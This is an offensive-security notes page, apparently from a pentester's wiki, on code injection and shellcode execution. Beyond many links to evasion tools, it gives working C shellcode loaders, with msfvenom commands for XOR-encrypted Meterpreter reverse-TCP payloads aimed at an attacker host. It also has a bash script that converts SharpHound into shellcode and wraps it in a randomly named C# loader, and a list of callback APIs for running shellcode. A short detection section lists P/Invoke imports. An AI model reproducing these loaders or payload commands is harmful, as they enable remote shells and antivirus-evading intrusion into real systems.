# Code Injection

- [https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [https://blog.xpnsec.com/weird-ways-to-execute-dotnet/](https://blog.xpnsec.com/weird-ways-to-execute-dotnet/)
- [https://gitlab.com/users/ORCA666/projects](https://gitlab.com/users/ORCA666/projects)




## Shellcode as Function

- [http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/](http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/)
- [https://www.fergonez.net/post/shellcode-csharp](https://www.fergonez.net/post/shellcode-csharp)
- [https://www.ired.team/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis](https://www.ired.team/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis)
- [https://github.com/byt3bl33d3r/OffensiveNim/issues/16](https://github.com/byt3bl33d3r/OffensiveNim/issues/16)
- [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Loaders/simpleLoader.c](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Loaders/simpleLoader.c)
- [https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1](https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1)

{% tabs %}
{% tab title="Windows" %}
{% code title="loader.c" %}
```c
#include <stdio.h>
#include <windows.h>

// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.13.37 LPORT=1337 -f raw -o met.bin --encrypt xor --encrypt-key a
// xxd -i met.bin > shellcode.h
#include "shellcode.h"

int main() {
    DWORD lpThreadId = 0;
    DWORD flOldProtect = 0;
    int bufsize = sizeof(buf);
    LPVOID f = VirtualAlloc(NULL, bufsize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    for (int i = 0; i < (int)bufsize-1; i++) { buf[i] = buf[i] ^ 'a'; }
    memcpy(f, buf, bufsize);
    VirtualProtect(f, bufsize, PAGE_EXECUTE_READ, &flOldProtect);
    ((void(*)())f)();
    //VirtualFree(f, 0, MEM_RELEASE);
    WaitForSingleObject((HANDLE)-1, -1);
    return 0;
}
```
{% endcode %}
{% endtab %}
{% tab title="Linux" %}
{% code title="loader.c" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.13.37 LPORT=1337 -f c -o met.c --encrypt xor --encrypt-key a
unsigned char buf[] = 
"\x31\x33\...\x33\x37";

int main (int argc, char **argv)
{
	int bufsize = (int)sizeof(buf);
	for (int i = 0; i < bufsize-1; i++) { buf[i] = buf[i] ^ 'a'; }
	int (*ret)() = (int(*)())buf;
	ret();
}
```
{% endcode %}

Compile allowing execution on stack:

```
$ gcc -o loader loader.c -z execstack
```
{% endtab %}
{% endtabs %}




## Shellcode In-Memory Fluctuation (Obfuscate and Sleep)

{% embed url="https://twitter.com/_RastaMouse/status/1443923456630968320" %}

- [https://www.solomonsklash.io/SleepyCrypt-shellcode-to-encrypt-a-running-image.html](https://www.solomonsklash.io/SleepyCrypt-shellcode-to-encrypt-a-running-image.html)
- [https://github.com/SolomonSklash/SleepyCrypt](https://github.com/SolomonSklash/SleepyCrypt)
- [https://gist.github.com/S3cur3Th1sSh1t/6022dc2050bb1b21be2105b8b0dc077d](https://gist.github.com/S3cur3Th1sSh1t/6022dc2050bb1b21be2105b8b0dc077d)
- [https://github.com/mgeeky/ShellcodeFluctuation](https://github.com/mgeeky/ShellcodeFluctuation)
- [https://github.com/phra/PEzor/blob/master/fluctuate.cpp](https://github.com/phra/PEzor/blob/master/fluctuate.cpp)
- [https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/](https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/)
- [https://xz.aliyun.com/t/9399](https://xz.aliyun.com/t/9399)
- [https://github.com/zu1k/beacon_hook_bypass_memscan](https://github.com/zu1k/beacon_hook_bypass_memscan)
- [https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html](https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html)
- [https://github.com/secidiot/FOLIAGE](https://github.com/secidiot/FOLIAGE)
- [https://github.com/y11en/FOLIAGE](https://github.com/y11en/FOLIAGE)
- [https://github.com/ShellBind/G0T-B0R3D/blob/main/Cs-Sleep-Mask-Fiber.c](https://github.com/ShellBind/G0T-B0R3D/blob/main/Cs-Sleep-Mask-Fiber.c)
- [https://github.com/Cracked5pider/Ekko/blob/main/Src/Ekko.c](https://github.com/Cracked5pider/Ekko/blob/main/Src/Ekko.c)
- [https://mez0.cc/posts/vulpes-obfuscating-memory-regions/](https://mez0.cc/posts/vulpes-obfuscating-memory-regions/)
- [https://github.com/janoglezcampos/DeathSleep](https://github.com/janoglezcampos/DeathSleep)
- [https://github.com/kyleavery/AceLdr](https://github.com/kyleavery/AceLdr)
- [https://blog.kyleavery.com/posts/avoiding-memory-scanners/](https://blog.kyleavery.com/posts/avoiding-memory-scanners/)
- [https://github.com/Idov31/Cronos](https://github.com/Idov31/Cronos)



### gargoyle

- [https://github.com/JLospinoso/gargoyle](https://github.com/JLospinoso/gargoyle)
- [https://lospi.net/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html](https://lospi.net/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html)
- [https://labs.f-secure.com/blog/experimenting-bypassing-memory-scanners-with-cobalt-strike-and-gargoyle/](https://labs.f-secure.com/blog/experimenting-bypassing-memory-scanners-with-cobalt-strike-and-gargoyle/)
- [https://www.arashparsa.com/bypassing-pesieve-and-moneta-the-easiest-way-i-could-find/](https://www.arashparsa.com/bypassing-pesieve-and-moneta-the-easiest-way-i-could-find/)
- [https://github.com/waldo-irc/YouMayPasser](https://github.com/waldo-irc/YouMayPasser)
- [https://github.com/thefLink/DeepSleep](https://github.com/thefLink/DeepSleep)



### Memory Scanners

- [https://github.com/forrest-orr/moneta](https://github.com/forrest-orr/moneta)
- [https://github.com/hasherezade/pe-sieve](https://github.com/hasherezade/pe-sieve)
- [https://github.com/waldo-irc/MalMemDetect](https://github.com/waldo-irc/MalMemDetect)
- [https://github.com/thefLink/Hunt-Sleeping-Beacons](https://github.com/thefLink/Hunt-Sleeping-Beacons)




## Thread Stack Spoofing

{% embed url="https://youtu.be/7EheXiC3MJE" %}

- [https://github.com/mgeeky/ThreadStackSpoofer/tree/c2507248723d167fb2feddf50d35435a17fd61a2](https://github.com/mgeeky/ThreadStackSpoofer/tree/c2507248723d167fb2feddf50d35435a17fd61a2)
- [https://github.com/mgeeky/ThreadStackSpoofer](https://github.com/mgeeky/ThreadStackSpoofer)
- [https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs/](https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs/)
- [https://github.com/countercept/CallStackSpoofer](https://github.com/countercept/CallStackSpoofer)
- [https://www.unknowncheats.me/forum/anti-cheat-bypass/268039-x64-return-address-spoofing-source-explanation.html](https://www.unknowncheats.me/forum/anti-cheat-bypass/268039-x64-return-address-spoofing-source-explanation.html)




## PE to Shellcode

- [https://github.com/monoxgas/sRDI](https://github.com/monoxgas/sRDI)
- [https://github.com/TheWover/donut](https://github.com/TheWover/donut)
- [https://github.com/hasherezade/pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode)

[Example](https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146) with [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) and donut (C# cross-compilation is done with [Mono](https://www.mono-project.com/download/stable/)):

{% code title="sweetblood.sh" %}
```bash
RNDNAME=`curl -sL https://github.com/snovvcrash/WeaponizeKali.sh/raw/main/misc/binaries.txt | shuf -n1`
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -qO /tmp/SharpHound.exe

# --ldapusername snovvcrash --ldappassword Passw0rd!
~/tools/PEzor/deps/donut/donut -a2 -z2 -i /tmp/SharpHound.exe -p '--CollectionMethod All,LoggedOn --NoSaveCache --OutputDirectory C:\Windows\Tasks --ZipFilename sweetbl.zip' -o /tmp/SharpHound.bin

BUF=`xxd -i /tmp/SharpHound.bin | head -n-2 | tail -n+2 | tr -d ' ' | tr -d '\n'`
BUFSIZE=`xxd -i /tmp/SharpHound.bin | tail -n1 | awk '{print $5}' | tr -d ';\n'`

cat << EOF > "/tmp/$RNDNAME.cs"
using System;
using System.Runtime.InteropServices;

namespace Sh4rpH0und
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, ulong dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[$BUFSIZE] { $BUF };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (ulong)buf.Length, 0x1000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
EOF

mcs -platform:x64 -t:winexe "/tmp/$RNDNAME.cs" -out:"$RNDNAME.exe"
file "$RNDNAME.exe"
rm "/tmp/SharpHound.exe" "/tmp/SharpHound.bin" "/tmp/$RNDNAME.cs"
```
{% endcode %}

{% hint style="info" %}
This technique is enhanced and automated [here](https://gist.github.com/snovvcrash/30bd25b1a5a18d8bb7ce3bb8dc2bae37).
{% endhint %}




## PE Injection

- [https://gist.github.com/hasherezade/e6daa4124fab73543497b6d1295ece10](https://gist.github.com/hasherezade/e6daa4124fab73543497b6d1295ece10)
- [https://xakep.ru/2018/08/27/doppelganging-process/](https://xakep.ru/2018/08/27/doppelganging-process/)
- [https://xakep.ru/2022/04/21/herpaderping-and-ghosting/](https://xakep.ru/2022/04/21/herpaderping-and-ghosting/)




## Shellcode Execution via Callbacks

- [https://github.com/aahmad097/AlternativeShellcodeExec](https://github.com/aahmad097/AlternativeShellcodeExec)
- [https://marcoramilli.com/2022/06/15/running-shellcode-through-windows-callbacks/](https://marcoramilli.com/2022/06/15/running-shellcode-through-windows-callbacks/)
- [https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/](https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/)
- [http://ropgadget.com/posts/abusing_win_functions.html](http://ropgadget.com/posts/abusing_win_functions.html)

```
CallWindowProc
CertEnumSystemStore
CertEnumSystemStoreLocation
CopyFile2
CopyFileEx
CryptEnumOIDInfo
EnumCalendarInfo
EnumCalendarInfoEx
EnumCalendarInfoExEx
EnumChildWindows
EnumDateFormats
EnumDesktopWindows
EnumDesktops
EnumDirTree
EnumDisplayMonitors
EnumFontFamilies
EnumFontFamiliesEx
EnumFonts
EnumLanguageGroupLocales
EnumObjects
EnumPageFiles
EnumPwrSchemes
EnumResourceTypes
EnumResourceTypesEx
EnumSystemCodePages
EnumSystemGeoID
EnumSystemLanguageGroups
EnumSystemLocales
EnumSystemLocalesEx
EnumThreadWindows
EnumTimeFormats
EnumTimeFormatsEx
EnumUILanguages
EnumWindowStations
EnumWindows
EnumerateLoadedModules
EnumerateLoadedModulesEx
ImageGetDigestStream
ImmEnumInputContext
InitOnceExecuteOnce
LdrEnumerateLoadedModules
LineDDA
NotifyIpInterfaceChange
NotifyRouteChange2
NotifyTeredoPortChange
NotifyUnicastIpAddressChange
SetupCommitFileQueue
SymEnumProcesses
SymFindFileInPath
VerifierEnumerateResource
```




## Detection

- [https://www.mono-project.com/docs/tools+libraries/tools/monodis/](https://www.mono-project.com/docs/tools+libraries/tools/monodis/)
- [https://github.com/Dump-GUY/Get-PDInvokeImports](https://github.com/Dump-GUY/Get-PDInvokeImports)

Show P/Invoke imports in a .NET assembly with `System.Reflection.Metadata` and PowerShell Core (stolen from [1](https://stackoverflow.com/q/71456804/6253579), [2](https://stackoverflow.com/a/54775040/6253579)):

```powershell
$assembly = "\path\to\csharp\binary.exe"
$stream = [System.IO.File]::OpenRead($assembly)
$peReader = [System.Reflection.PortableExecutable.PEReader]::new($stream, [System.Reflection.PortableExecutable.PEStreamOptions]::LeaveOpen -bor [System.Reflection.PortableExecutable.PEStreamOptions]::PrefetchMetadata)
$metadataReader = [System.Reflection.Metadata.PEReaderExtensions]::GetMetadataReader($peReader)
$assemblyDefinition = $metadataReader.GetAssemblyDefinition()

foreach($typeHandler in $metadataReader.TypeDefinitions) {
    $typeDef = $metadataReader.GetTypeDefinition($typeHandler)
    foreach($methodHandler in $typeDef.GetMethods()) {
        $methodDef = $metadataReader.GetMethodDefinition($methodHandler)

        $import = $methodDef.GetImport()
        if ($import.Module.IsNil) {
            continue
        }

        $dllImportFuncName = $metadataReader.GetString($import.Name)
        $dllImportParameters = $import.Attributes.ToString()
        $dllImportPath = $metadataReader.GetString($metadataReader.GetModuleReference($import.Module).Name)
        Write-Host "$dllImportPath, $dllImportParameters`n$dllImportFuncName`n"
    }
}
```

Another [method](https://twitter.com/vinopaljiri/status/1508447487048261641) with a PowerShell one-liner:

```powershell
([System.Reflection.Assembly]::LoadFile("\path\to\csharp\binary.exe")).GetTypes() | % {$_.GetMethods([Reflection.BindingFlags]::Public -bxor [Reflection.BindingFlags]::NonPublic -bxor [Reflection.BindingFlags]::Static) | ? {$_.Attributes -band [Reflection.MethodAttributes]::PinvokeImpl}} | fl -Property Name,DeclaringType,CustomAttributes
```




## Tools

- [https://github.com/0xDivyanshu/Injector](https://github.com/0xDivyanshu/Injector)
- [https://github.com/jfmaes/SharpZipRunner](https://github.com/jfmaes/SharpZipRunner)
- [https://github.com/plackyhacker/Shellcode-Injection-Techniques](https://github.com/plackyhacker/Shellcode-Injection-Techniques)
- [https://github.com/3xpl01tc0d3r/ProcessInjection](https://github.com/3xpl01tc0d3r/ProcessInjection)
